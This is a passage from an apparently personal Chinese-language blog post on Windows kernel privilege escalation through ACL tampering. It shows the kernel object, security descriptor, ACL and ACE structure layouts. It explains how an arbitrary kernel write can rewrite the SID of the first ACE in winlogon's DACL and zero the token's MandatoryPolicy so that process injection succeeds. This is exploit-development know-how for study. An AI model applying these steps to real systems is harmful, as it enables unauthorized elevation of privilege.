+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x38 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LONGLONG PointerCount;                                                  <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        LONGLONG HandleCount;                                               <span class="comment">//0x8</span></span><br><span class="line">        VOID* NextToFree;                                                   <span class="comment">//0x8</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_PUSH_LOCK</span> <span class="title">Lock</span>;</span>                                              <span class="comment">//0x10</span></span><br><span class="line">    UCHAR TypeIndex;                                                        <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        UCHAR TraceFlags;                                                   <span class="comment">//0x19</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR DbgRefTrace:<span class="number">1</span>;                                            <span class="comment">//0x19</span></span><br><span class="line">            UCHAR DbgTracePermanent:<span class="number">1</span>;                                      <span class="comment">//0x19</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    UCHAR InfoMask;                                                         <span class="comment">//0x1a</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        UCHAR Flags;                                                        <span class="comment">//0x1b</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR NewObject:<span class="number">1</span>;                                              <span class="comment">//0x1b</span></span><br><span class="line">            UCHAR KernelObject:<span class="number">1</span>;                                           <span class="comment">//0x1b</span></span><br><span class="line">            UCHAR KernelOnlyAccess:<span class="number">1</span>;                                       <span class="comment">//0x1b</span></span><br><span class="line">            UCHAR ExclusiveObject:<span class="number">1</span>;                                        <span class="comment">//0x1b</span></span><br><span class="line">            UCHAR PermanentObject:<span class="number">1</span>;                                        <span class="comment">//0x1b</span></span><br><span class="line">            UCHAR DefaultSecurityQuota:<span class="number">1</span>;                                   <span class="comment">//0x1b</span></span><br><span class="line">            UCHAR SingleHandleEntry:<span class="number">1</span>;                                      <span class="comment">//0x1b</span></span><br><span class="line">            UCHAR DeletedInline:<span class="number">1</span>;                                          <span class="comment">//0x1b</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Reserved;                                                         <span class="comment">//0x1c</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_CREATE_INFORMATION</span>* <span class="title">ObjectCreateInfo</span>;</span>                <span class="comment">//0x20</span></span><br><span class="line">        VOID* QuotaBlockCharged;                                            <span class="comment">//0x20</span></span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* SecurityDescriptor;                                               <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">QUAD</span> <span class="title">Body</span>;</span>                                                      <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+<p>Body就是实际的对象, 所以<code>实际对象的地址 - 0x30</code>就是该对象的<code>_OBJECT_HEADER</code>地址</p>
+<p><code>SecurityDescriptor</code>是<code>_OBJECT_HEADER</code>结构中的一个关键字段，它存储了对象的安全描述符(Security Descriptor)，用于控制对该内核对象的访问权限</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x28 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR Revision;         <span class="comment">//0x0</span></span><br><span class="line">    UCHAR Sbz1;             <span class="comment">//0x1</span></span><br><span class="line">    USHORT Control;         <span class="comment">//0x2</span></span><br><span class="line">    VOID* Owner;            <span class="comment">//0x8</span></span><br><span class="line">    VOID* Group;            <span class="comment">//0x10</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACL</span>* <span class="title">Sacl</span>;</span>      <span class="comment">//0x18</span></span><br><span class="line">    <span class="comment">//系统访问控制列表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACL</span>* <span class="title">Dacl</span>;</span>      <span class="comment">//0x20</span></span><br><span class="line">    <span class="comment">// 自由访问控制列表（用于权限控制）</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+<p>在早期, 可以通过将<code>SecurityDescriptor</code>修改为NULL, 使得一个地权限的用户也能够修改和编辑高权限进程, 从而可以进行进程注入获得shell</p>
+<p>但没多久就被patch, 修改为NULL后会BOSD, 所以现在利用<code>SecurityDescriptor</code>提权主要是通过任意写修改其<code>Dacl</code>字段</p>
+<p>DACL 的 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/d-gly">任意访问控制列表</a> 由对象的所有者或授予WRITE_DAC对象访问权限的任何人控制。 它指定特定的用户和组对对象的访问权限。 例如，文件的所有者可以使用 DACL 来控制哪些用户和组可以和不能访问该文件。</p>
+<p>对象还可以具有与之关联的系统级安全信息，其形式为 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/s-gly">系统访问控制列表</a> (SACL) 由系统管理员控制。 SACL 允许系统管理员审核获取对象访问权限的任何尝试。</p>
+<p>Dacl指向一个_ACL结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">ACL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR AclRevision;      <span class="comment">//0x0</span></span><br><span class="line">    UCHAR Sbz1;             <span class="comment">//0x1</span></span><br><span class="line">    USHORT AclSize;         <span class="comment">//0x2</span></span><br><span class="line">    <span class="comment">//指定 ACL 的大小（以字节为单位）。 </span></span><br><span class="line">    <span class="comment">//此值包括 ACL 结构、所有 ACE 以及可能未使用的内存。</span></span><br><span class="line">    USHORT AceCount;        <span class="comment">//0x4</span></span><br><span class="line">    <span class="comment">//指定 ACL 中存储的 ACE 数。</span></span><br><span class="line">    USHORT Sbz2;            <span class="comment">//0x6</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+<p>_ACL结构体后面跟着零个或多个 ACE 的顺序列表</p>
+<p>常见ACE类型表</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">ACE类型</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">ACCESS_ALLOWED_ACE</td>
+<td style="text-align:left">允许特定权限</td>
+</tr>
+<tr>
+<td style="text-align:left">ACCESS_DENIED_ACE</td>
+<td style="text-align:left">拒绝特定权限</td>
+</tr>
+<tr>
+<td style="text-align:left">SYSTEM_AUDIT_ACE</td>
+<td style="text-align:left">用于SACL，记录安全审计</td>
+</tr>
+<tr>
+<td style="text-align:left">SYSTEM_ALARM_ACE</td>
+<td style="text-align:left">用于SACL，触发警报</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>我们主要关注_ACCESS_ALLOWED_ACE</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ACCESS_ALLOWED_ACE</span> &#123;</span></span><br><span class="line">  ACE_HEADER  Header;</span><br><span class="line">  ACCESS_MASK Mask;</span><br><span class="line">  DWORD       SidStart;</span><br><span class="line">&#125; ACCESS_ALLOWED_ACE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ACE_HEADER</span> &#123;</span></span><br><span class="line">  BYTE AceType;</span><br><span class="line">  BYTE AceFlags;</span><br><span class="line">  WORD AceSize;</span><br><span class="line">&#125; ACE_HEADER;</span><br></pre></td></tr></table></figure>
+<p>所以提权所要做的就是修改SID字段</p>
+<p>常见的SID有</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">SID</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">S-1-5-11</td>
+<td style="text-align:left">Authenticated Users (已认证用户)</td>
+</tr>
+<tr>
+<td style="text-align:left">S-1-5-18</td>
+<td style="text-align:left">Local System (系统账户)</td>
+</tr>
+<tr>
+<td style="text-align:left">S-1-1-0</td>
+<td style="text-align:left">Everyone (所有用户)</td>
+</tr>
+<tr>
+<td style="text-align:left">S-1-5-32-544</td>
+<td style="text-align:left">Administrators (管理员组)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>例如winlogon进程的第一个ACE的sid就是S-1-5-18</p>
+<p>如果将其修改为S-1-5-11, 那么较权限进程也能访问和修改winlogon进程</p>
+<p>不过该提权方法,还需要修改漏洞利用进程的_token结构体中的MandatoryPolicy字段为0, 要不然会因为完整性的原因, 导致注入高权限进程失败</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>TOKEN_MANDATORY_POLICY_OFF</strong>0x0</td>
+<td>No mandatory integrity policy is enforced for the token.</td>
+</tr>
+<tr>
+<td><strong>TOKEN_MANDATORY_POLICY_NO_WRITE_UP</strong>0x1</td>
+<td>A process associated with the token cannot write to objects that have a greater mandatory integrity level.</td>
+</tr>
+<tr>
+<td><strong>TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN</strong>0x2</td>
+<td>A process created with the token has an integrity level that is the lesser of the parent-process integrity level and the executable-file integrity level.</td>
+</tr>
+<tr>
+<td><strong>TOKEN_MANDATORY_POLICY_VALID_MASK</strong>0x3</td>
+<td>A combination of <strong>TOKEN_MANDATORY_POLICY_NO_WRITE_UP</strong> and <strong>TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN</strong>.</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>不过既然如此麻烦, 还不如直接用token提权, 所以该提权方案实际上并不常用</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#token%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">token提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Replacing-Tokens-for-Privilege-Escalation"><span class="toc-number">1.1.</span> <span class="toc-text">Replacing Tokens for Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Modifying-Token-Privileges"><span class="toc-number">1.2.</span> <span class="toc-text">Modifying Token Privileges</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#KASLR"><span class="toc-number">2.</span> <span class="toc-text">KASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NtQuerySystemInformation"><span class="toc-number">2.1.</span> <span class="toc-text">NtQuerySystemInformation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SystemModuleInformation"><span class="toc-number">2.1.1.</span> <span class="toc-text">SystemModuleInformation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SystemHandleInformation"><span class="toc-number">2.1.2.</span> <span class="toc-text">SystemHandleInformation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EnumDeviceDrivers"><span class="toc-number">2.2.</span> <span class="toc-text">EnumDeviceDrivers</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#KCFG"><span class="toc-number">3.</span> <span class="toc-text">KCFG</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RtlSetAllBits"><span class="toc-number">3.1.</span> <span class="toc-text">RtlSetAllBits</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RtlClearAllBits"><span class="toc-number">3.2.</span> <span class="toc-text">RtlClearAllBits</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACL%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">ACL提权</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/36975/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/36975/&text=winlpe"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/36975/&is_video=false&description=winlpe"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=winlpe&body=Check out this article: https://ixout.github.io/posts/36975/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/36975/&name=winlpe&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/36975/&t=winlpe"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    ixout
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
